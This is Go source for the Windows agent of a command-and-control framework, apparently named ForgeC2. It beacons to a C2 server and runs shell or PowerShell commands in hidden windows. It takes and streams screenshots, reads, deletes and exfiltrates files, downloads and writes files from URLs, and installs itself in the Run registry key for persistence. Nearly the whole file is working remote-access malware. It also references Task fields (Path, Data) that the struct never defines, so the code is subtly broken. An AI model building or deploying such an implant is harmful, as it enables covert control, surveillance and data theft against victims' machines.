//go:build windows
// +build windows

package main

import (
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	mathRand "math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"image"
	"image/jpeg"
	"image/png"
)

// These variables are injected at compile time via -ldflags "-X main.C2URL=..."
// This source is used exclusively by the Generate Agent flow (EXE).
var (
	C2URL           string = "http://127.0.0.1:8080"
	Interval        int    = 10
	Jitter          int    = 20
	UserAgent       string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	Persist         bool   = false
	SkipTLSVerify   bool   = true // for self-signed C2 certs
	FastInterval    int    = 1    // Fast interval for screen monitoring (1 second)
	inFastMode      bool   = false
)

// Windows API for pure Go screenshot (no PowerShell)
var (
	user32 = syscall.NewLazyDLL("user32.dll")
	gdi32  = syscall.NewLazyDLL("gdi32.dll")
	shcore = syscall.NewLazyDLL("shcore.dll")
)

var (
	procGetDC                      = user32.NewProc("GetDC")
	procReleaseDC                  = user32.NewProc("ReleaseDC")
	procGetSystemMetrics           = user32.NewProc("GetSystemMetrics")
	procSetProcessDPIAware         = user32.NewProc("SetProcessDPIAware")
	procSetProcessDpiAwareness     = shcore.NewProc("SetProcessDpiAwareness")
	procCreateCompatibleDC         = gdi32.NewProc("CreateCompatibleDC")
	procCreateCompatibleBitmap     = gdi32.NewProc("CreateCompatibleBitmap")
	procSelectObject               = gdi32.NewProc("SelectObject")
	procBitBlt                       = gdi32.NewProc("BitBlt")
	procGetDIBits                    = gdi32.NewProc("GetDIBits")
	procDeleteDC                     = gdi32.NewProc("DeleteDC")
	procDeleteObject                 = gdi32.NewProc("DeleteObject")
)

const (
	SM_XVIRTUALSCREEN  = 76
	SM_YVIRTUALSCREEN  = 77
	SM_CXVIRTUALSCREEN = 78
	SM_CYVIRTUALSCREEN = 79
	SRCCOPY            = 0x00CC0020
	DIB_RGB_COLORS     = 0
)

type BITMAPINFOHEADER struct {
	biSize          uint32
	biWidth         int32
	biHeight        int32
	biPlanes        uint16
	biBitCount      uint16
	biCompression   uint32
	biSizeImage     uint32
	biXPelsPerMeter int32
	biYPelsPerMeter int32
	biClrUsed       uint32
	biClrImportant  uint32
}

// BeaconRequest is sent by agent
type BeaconRequest struct {
	UUID    string                 `json:"uuid"`
	Info    map[string]string      `json:"info,omitempty"`
	Results []TaskResult           `json:"results,omitempty"`
}

// TaskResult for completed tasks
type TaskResult struct {
	TaskID   uint   `json:"task_id"`
	Type     string `json:"type"`
	Output   string `json:"output"`
	Error    string `json:"error,omitempty"`
	Encoding string `json:"encoding,omitempty"`
	Filename string `json:"filename,omitempty"`
	Size     int    `json:"size,omitempty"`
	Path     string `json:"path,omitempty"`
}

// BeaconResponse from server
type BeaconResponse struct {
	Tasks []Task `json:"tasks"`
}

// Task from C2
type Task struct {
	ID      uint   `json:"id"`
	Type    string `json:"type"`
	Command string `json:"command"`
	Shell   string `json:"shell"`
}

var (
	client            *http.Client
	agentUUID         string
	rng               = newCryptoRand()
	pendingResults    []TaskResult
	screenStreaming   bool
)

func newCryptoRand() *mathRand.Rand {
	seed := make([]byte, 8)
	rand.Read(seed)
	src := mathRand.NewSource(int64(binary.LittleEndian.Uint64(seed)))
	return mathRand.New(src)
}

func init() {
	// TLS verification controlled by SkipTLSVerify (injected at build time)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: SkipTLSVerify},
	}
	client = &http.Client{Transport: tr, Timeout: 30 * time.Second}
}

func main() {
	log.SetFlags(0)
	fmt.Println("[ForgeC2] Agent starting...")

	if Persist {
		addPersistence()
	}

	// Initial registration / first beacon
	agentUUID = registerOrGetUUID()

	// Main beacon loop
	for {
		doBeacon()
		sleepWithJitter()
	}
}

func sleepWithJitter() {
	baseInterval := Interval
	if inFastMode {
		baseInterval = FastInterval
	}
	base := time.Duration(baseInterval) * time.Second
	jit := float64(Jitter) / 100.0
	variation := time.Duration(float64(base) * jit * (rng.Float64()*2 - 1))
	time.Sleep(base + variation)
}

func checkFastMode(tasks []Task) {
	inFastMode = false
	for _, task := range tasks {
		if task.Type == "screenshot" {
			inFastMode = true
			return
		}
	}
}

func registerOrGetUUID() string {
	// On first run, no persisted UUID, server will assign on first beacon
	// For simplicity, we generate here and send, server uses it or creates
	uuidFile := os.Getenv("TEMP") + "\\forgec2_uuid.txt"
	if data, err := os.ReadFile(uuidFile); err == nil && len(data) > 0 {
		return strings.TrimSpace(string(data))
	}
	// Generate new using crypto/rand (RFC 4122 compliant)
	var buf [16]byte
	if _, err := rand.Read(buf[:]); err == nil {
		buf[6] = (buf[6] & 0x0f) | 0x40 // version 4
		buf[8] = (buf[8] & 0x3f) | 0x80 // variant 10
		newUUID := fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
			buf[0:4], buf[4:6], buf[6:8], buf[8:10], buf[10:16])
		os.WriteFile(uuidFile, []byte(newUUID), 0644)
		return newUUID
	}
	// Fallback (should never happen)
	newUUID := fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
		rng.Uint32(), rng.Uint32()&0xffff, rng.Uint32()&0xffff|0x4000,
		rng.Uint32()&0x3fff|0x8000, rng.Uint64())
	os.WriteFile(uuidFile, []byte(newUUID), 0644)
	return newUUID
}

func doBeacon() {
	info := getSystemInfo()
	req := BeaconRequest{
		UUID:    agentUUID,
		Info:    info,
		Results: pendingResults,
	}

	pendingResults = nil // sent

	body, _ := json.Marshal(req)
	respBody := sendBeacon(body)
	if respBody == nil {
		return
	}

	var resp BeaconResponse
	if err := json.Unmarshal(respBody, &resp); err != nil {
		log.Printf("[!] Failed to parse response: %v", err)
		return
	}

	checkFastMode(resp.Tasks)

	for _, task := range resp.Tasks {
		result := executeTask(task)
		pendingResults = append(pendingResults, result)
	}
}

func sendBeacon(body []byte) []byte {
	req, err := http.NewRequest("POST", C2URL+"/api/v1/beacon", bytes.NewReader(body))
	if err != nil {
		return nil
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", UserAgent)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("[!] Beacon failed: %v\n", err)
		return nil
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		fmt.Printf("[!] Server returned %d\n", resp.StatusCode)
		return nil
	}
	data, _ := io.ReadAll(resp.Body)
	return data
}

func sendTaskResult(res TaskResult) {
	// Reuse beacon mechanism or dedicated, here we do a quick beacon with result
	req := BeaconRequest{
		UUID:    agentUUID,
		Results: []TaskResult{res},
	}
	body, _ := json.Marshal(req)
	sendBeacon(body) // fire and forget for simplicity
}

func sendScreenFrame(data []byte) {
	b64 := base64.StdEncoding.EncodeToString(data)
	req := struct {
		UUID string `json:"uuid"`
		Data string `json:"data"`
	}{
		UUID: agentUUID,
		Data: b64,
	}
	body, _ := json.Marshal(req)
	httpReq, err := http.NewRequest("POST", C2URL+"/api/v1/screen_frame", bytes.NewReader(body))
	if err != nil {
		return
	}
	httpReq.Header.Set("Content-Type", "application/json")
	httpReq.Header.Set("User-Agent", UserAgent)
	client.Do(httpReq) // fire and forget
}

func getSystemInfo() map[string]string {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	if username == "" {
		username = "unknown"
	}
	ip := getOutboundIP()

	// Match PS1 behavior: base64 encode sensitive fields + flag encoding
	utf8 := []byte(hostname)
	hostnameB64 := base64.StdEncoding.EncodeToString(utf8)
	usernameB64 := base64.StdEncoding.EncodeToString([]byte(username))
	ipB64 := base64.StdEncoding.EncodeToString([]byte(ip))

	return map[string]string{
		"hostname": hostnameB64,
		"username": usernameB64,
		"os":       runtime.GOOS,
		"arch":     runtime.GOARCH,
		"ip":       ipB64,
		"encoding": "base64",
	}
}

func getOutboundIP() string {
	// Simple way to get preferred outbound IP
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "unknown"
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}

func executeTask(task Task) TaskResult {
	res := TaskResult{
		TaskID: task.ID,
		Type:   task.Type,
	}

	switch task.Type {
	case "shell":
		out, err := runShell(task.Command, task.Shell)
		if err != nil {
			res.Error = err.Error()
		}
		res.Output = out

	case "screenshot":
		data, err := takeScreenshot()
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = base64.StdEncoding.EncodeToString(data)
			res.Encoding = "base64"
			res.Size = len(data)
			inFastMode = true // speed up next beacons while monitoring
		}

	case "screen_stream_start":
		if !screenStreaming {
			screenStreaming = true
			go func() {
				for screenStreaming {
					data, err := takeScreenshotJPEG(65)
					if err == nil {
						sendScreenFrame(data)
					}
					time.Sleep(150 * time.Millisecond) // ~6-7 fps
				}
			}()
		}
		res.Output = "screen stream started"

	case "screen_stream_stop":
		screenStreaming = false
		res.Output = "screen stream stopped"

	case "ps":
		out, err := getProcessList()
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
			res.Encoding = "base64"
		}

	case "ls":
		path := task.Path
		if path == "" {
			path = task.Command
		}
		out, err := listDirectory(path)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
			res.Encoding = "base64"
			res.Path = path
		}

	case "delete":
		path := task.Path
		if path == "" {
			path = task.Command
		}
		err := deleteFileOrDir(path)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = "Deleted: " + path
			res.Path = path
		}

	case "read":
		path := task.Path
		if path == "" {
			path = task.Command
		}
		data, err := readFileContent(path)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = base64.StdEncoding.EncodeToString(data)
			res.Encoding = "base64"
			res.Path = path
			res.Size = len(data)
		}

	case "download":
		if strings.HasPrefix(strings.ToLower(task.Command), "http") {
			// URL download to local path (Command = url, Shell or Path = dest path)
			dest := task.Shell
			if dest == "" {
				dest = task.Path
			}
			if dest == "" {
				dest = task.Command[strings.LastIndex(task.Command, "/")+1:]
			}
			if err := downloadFromURL(task.Command, dest); err != nil {
				res.Error = err.Error()
			} else {
				res.Output = "Downloaded to: " + dest
				res.Path = dest
			}
		} else {
			// Agent reads local file and returns content to C2 (exfil)
			path := task.Path
			if path == "" {
				path = task.Command
			}
			data, err := downloadFile(path)
			if err != nil {
				res.Error = err.Error()
			} else {
				res.Output = base64.StdEncoding.EncodeToString(data)
				res.Encoding = "base64"
				res.Path = path
				res.Size = len(data)
				if idx := strings.LastIndex(path, "\\"); idx != -1 {
					res.Filename = path[idx+1:]
				} else {
					res.Filename = path
				}
			}
		}

	case "upload":
		path := task.Path
		if path == "" {
			path = task.Command
		}
		if task.Data != "" || task.Shell != "" {
			// Server -> agent file write (push): Data or Shell carries base64 content
			b64 := task.Data
			if b64 == "" {
				b64 = task.Shell
			}
			err := uploadFile(path, b64)
			if err != nil {
				res.Error = err.Error()
			} else {
				res.Output = "File uploaded successfully"
				res.Path = path
			}
		} else {
			// Agent -> server file exfil (upload from target): Path/Command = path to read
			data, err := os.ReadFile(path)
			if err != nil {
				res.Error = err.Error()
			} else {
				res.Output = base64.StdEncoding.EncodeToString(data)
				res.Encoding = "base64"
				res.Path = path
				res.Size = len(data)
				if idx := strings.LastIndex(path, "\\"); idx != -1 {
					res.Filename = path[idx+1:]
				} else {
					res.Filename = path
				}
			}
		}

	case "kill":
		res.Output = "Agent terminating..."
		sendTaskResult(res) // try to report before exit
		time.Sleep(300 * time.Millisecond)
		os.Exit(0)

	default:
		res.Error = "unknown task type: " + task.Type
	}
	return res
}

func runShell(cmdStr, shell string) (string, error) {
	var cmd *exec.Cmd
	if shell == "powershell.exe" || strings.Contains(cmdStr, "powershell") {
		cmd = exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", cmdStr)
	} else {
		cmd = exec.Command("cmd.exe", "/C", cmdStr)
	}
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} // hide console window

	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	err := cmd.Run()
	return out.String(), err
}

// setDPIAware tries to make the process DPI aware (for accurate multi-monitor screenshots)
func setDPIAware() {
	if procSetProcessDpiAwareness != nil {
		procSetProcessDpiAwareness.Call(2) // PROCESS_PER_MONITOR_DPI_AWARE
	} else if procSetProcessDPIAware != nil {
		procSetProcessDPIAware.Call()
	}
}

func getVirtualScreen() (x, y, w, h int32) {
	x = int32(getSystemMetrics(SM_XVIRTUALSCREEN))
	y = int32(getSystemMetrics(SM_YVIRTUALSCREEN))
	w = int32(getSystemMetrics(SM_CXVIRTUALSCREEN))
	h = int32(getSystemMetrics(SM_CYVIRTUALSCREEN))
	return
}

func getSystemMetrics(nIndex int) uintptr {
	ret, _, _ := procGetSystemMetrics.Call(uintptr(nIndex))
	return ret
}

func getDC(hwnd uintptr) uintptr {
	ret, _, _ := procGetDC.Call(hwnd)
	return ret
}

func releaseDC(hwnd, hdc uintptr) {
	procReleaseDC.Call(hwnd, hdc)
}

func createCompatibleDC(hdc uintptr) uintptr {
	ret, _, _ := procCreateCompatibleDC.Call(hdc)
	return ret
}

func createCompatibleBitmap(hdc uintptr, w, h int32) uintptr {
	ret, _, _ := procCreateCompatibleBitmap.Call(hdc, uintptr(w), uintptr(h))
	return ret
}

func selectObject(hdc, obj uintptr) uintptr {
	ret, _, _ := procSelectObject.Call(hdc, obj)
	return ret
}

func bitBlt(hdcDest uintptr, x, y, w, h int32, hdcSrc uintptr, xSrc, ySrc int32, rop uint32) bool {
	ret, _, _ := procBitBlt.Call(
		hdcDest,
		uintptr(x), uintptr(y), uintptr(w), uintptr(h),
		hdcSrc,
		uintptr(xSrc), uintptr(ySrc),
		uintptr(rop),
	)
	return ret != 0
}

func getDIBits(hdc, hbmp uintptr, start, lines uint32, bits unsafe.Pointer, bmi unsafe.Pointer, usage uint32) int {
	ret, _, _ := procGetDIBits.Call(
		hdc,
		hbmp,
		uintptr(start),
		uintptr(lines),
		uintptr(bits),
		uintptr(bmi),
		uintptr(usage),
	)
	return int(ret)
}

func deleteDC(hdc uintptr) {
	procDeleteDC.Call(hdc)
}

func deleteObject(obj uintptr) {
	procDeleteObject.Call(obj)
}

// captureScreenRGBA does the low level GDI capture and returns RGBA image.
func captureScreenRGBA() (*image.RGBA, error) {
	setDPIAware()

	x, y, w, h := getVirtualScreen()
	if w <= 0 || h <= 0 {
		return nil, fmt.Errorf("invalid virtual screen size")
	}

	hdc := getDC(0)
	if hdc == 0 {
		return nil, fmt.Errorf("GetDC failed")
	}
	defer releaseDC(0, hdc)

	hdcMem := createCompatibleDC(hdc)
	if hdcMem == 0 {
		return nil, fmt.Errorf("CreateCompatibleDC failed")
	}
	defer deleteDC(hdcMem)

	hbm := createCompatibleBitmap(hdc, w, h)
	if hbm == 0 {
		return nil, fmt.Errorf("CreateCompatibleBitmap failed")
	}
	defer deleteObject(hbm)

	selectObject(hdcMem, hbm)

	if !bitBlt(hdcMem, 0, 0, w, h, hdc, x, y, SRCCOPY) {
		return nil, fmt.Errorf("BitBlt failed")
	}

	bmi := BITMAPINFOHEADER{
		biSize:        uint32(unsafe.Sizeof(BITMAPINFOHEADER{})),
		biWidth:       w,
		biHeight:      -h, // top-down DIB
		biPlanes:      1,
		biBitCount:    32,
		biCompression: 0, // BI_RGB
		biSizeImage:   uint32(w * h * 4),
	}

	buf := make([]byte, w*h*4)

	if getDIBits(hdc, hbm, 0, uint32(h), unsafe.Pointer(&buf[0]), unsafe.Pointer(&bmi), DIB_RGB_COLORS) == 0 {
		return nil, fmt.Errorf("GetDIBits failed")
	}

	// BGRA -> RGBA
	for i := 0; i < len(buf); i += 4 {
		buf[i], buf[i+2] = buf[i+2], buf[i]
	}

	img := &image.RGBA{
		Pix:    buf,
		Stride: int(w * 4),
		Rect:   image.Rect(0, 0, int(w), int(h)),
	}
	return img, nil
}

func takeScreenshot() ([]byte, error) {
	img, err := captureScreenRGBA()
	if err != nil {
		return nil, err
	}
	var pngBuf bytes.Buffer
	if err := png.Encode(&pngBuf, img); err != nil {
		return nil, err
	}
	return pngBuf.Bytes(), nil
}

func takeScreenshotJPEG(quality int) ([]byte, error) {
	img, err := captureScreenRGBA()
	if err != nil {
		return nil, err
	}
	var jpegBuf bytes.Buffer
	opts := &jpeg.Options{Quality: quality}
	if err := jpeg.Encode(&jpegBuf, img, opts); err != nil {
		return nil, err
	}
	return jpegBuf.Bytes(), nil
}

func addPersistence() {
	// Add persistence via HKCU\Software\Microsoft\Windows\CurrentVersion\Run
	// This runs the agent on user login
	exePath, err := os.Executable()
	if err != nil {
		fmt.Printf("[!] Failed to get executable path: %v\n", err)
		return
	}

	// Use reg.exe for simplicity (no extra deps)
	cmd := exec.Command("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "ForgeC2", "/t", "REG_SZ", "/d", exePath, "/f")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := cmd.Run(); err != nil {
		fmt.Printf("[!] Failed to add persistence: %v\n", err)
	} else {
		fmt.Printf("[*] Persistence added: %s\n", exePath)
	}
}

// uploadFile writes base64-encoded content to a file
// path = target path on disk
// b64Content = base64 file data from server
func uploadFile(path string, b64Content string) error {
	data, err := base64.StdEncoding.DecodeString(b64Content)
	if err != nil {
		return fmt.Errorf("base64 decode failed: %w", err)
	}
	if err := os.WriteFile(path, data, 0644); err != nil {
		return fmt.Errorf("write file failed: %w", err)
	}
	return nil
}

// getProcessList produces a simple process table similar to the PS1 agent
func getProcessList() (string, error) {
	// Use PowerShell for rich output (matches PS1 agent behavior)
	script := `Get-Process | Select-Object -Property Id, ProcessName, CPU, WorkingSet64 | Sort-Object -Property WorkingSet64 -Descending | Select-Object -First 50 | Format-Table -AutoSize | Out-String`
	cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	out, err := cmd.Output()
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(out)), nil
}

// listDirectory lists a directory with simple tabular output (Type Name Size Modified)
func listDirectory(path string) (string, error) {
	if path == "" {
		path = "C:\\"
	}
	entries, err := os.ReadDir(path)
	if err != nil {
		return "", err
	}

	var sb strings.Builder
	sb.WriteString("Type\tName\tSize\tModified\n")
	sb.WriteString(strings.Repeat("-", 80) + "\n")

	for _, e := range entries {
		info, err := e.Info()
		mod := ""
		size := "-"
		if err == nil {
			mod = info.ModTime().Format("2006-01-02 15:04")
			if !e.IsDir() {
				size = fmt.Sprintf("%d", info.Size())
			}
		}
		typ := "FILE"
		if e.IsDir() {
			typ = "DIR"
		}
		sb.WriteString(fmt.Sprintf("%s\t%s\t%s\t%s\n", typ, e.Name(), size, mod))
	}
	return sb.String(), nil
}

// deleteFileOrDir removes file or directory (recursive)
func deleteFileOrDir(path string) error {
	if path == "" {
		return fmt.Errorf("path required")
	}
	return os.RemoveAll(path)
}

// readFileContent returns raw bytes of a file (for "read" task)
func readFileContent(path string) ([]byte, error) {
	if path == "" {
		return nil, fmt.Errorf("path required")
	}
	return os.ReadFile(path)
}

// downloadFile reads a file from disk and returns its content
func downloadFile(path string) ([]byte, error) {
	if path == "" {
		return nil, fmt.Errorf("path required")
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("read file failed: %w", err)
	}
	return data, nil
}

// downloadFromURL downloads a file from HTTP URL to dest path on disk
func downloadFromURL(urlStr, destPath string) error {
	if destPath == "" {
		return fmt.Errorf("destination path required")
	}
	req, err := http.NewRequest("GET", urlStr, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", UserAgent)

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("http status %d", resp.StatusCode)
	}

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	return os.WriteFile(destPath, data, 0644)
}
